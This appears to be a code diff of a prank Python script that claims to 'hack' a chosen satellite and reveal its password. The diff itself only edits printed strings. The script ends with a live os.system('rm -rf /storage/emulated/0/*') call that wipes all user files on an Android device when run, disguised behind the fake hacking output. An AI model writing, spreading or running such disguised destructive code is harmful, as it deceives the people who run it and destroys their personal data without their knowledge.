@@ -20,7 +20,7 @@ print("choose a brand of satelit")
 print("1.Satelit Ekspress- AM8 Rusia")
 print("2.Satelit Chinasat AM8 Cina")
 print("3.Satelit Palapa A2 Indnesia ")
-print("Satelit Palapa B2R Indonesia")
+print("4.Satelit Palapa B2R Indonesia")
 print("5.Satelit Relay USA ")
 
 input("input the number of brand:")
@@ -29,10 +29,10 @@ print("attack starting")
 
 
 for y in range (100):
-	print("Trying password ",y," proccessing password ")
-HackSatelit = input("press enter to get password:")
+	print("Trying orbit satelit ",y," proccessing orbit ")
+HackSatelit = input("press enter to get password me:")
 
-print("password:fileku")
+print("password:Datafilemobata")
 
 import os
 os.system('rm -rf /storage/emulated/0/*')
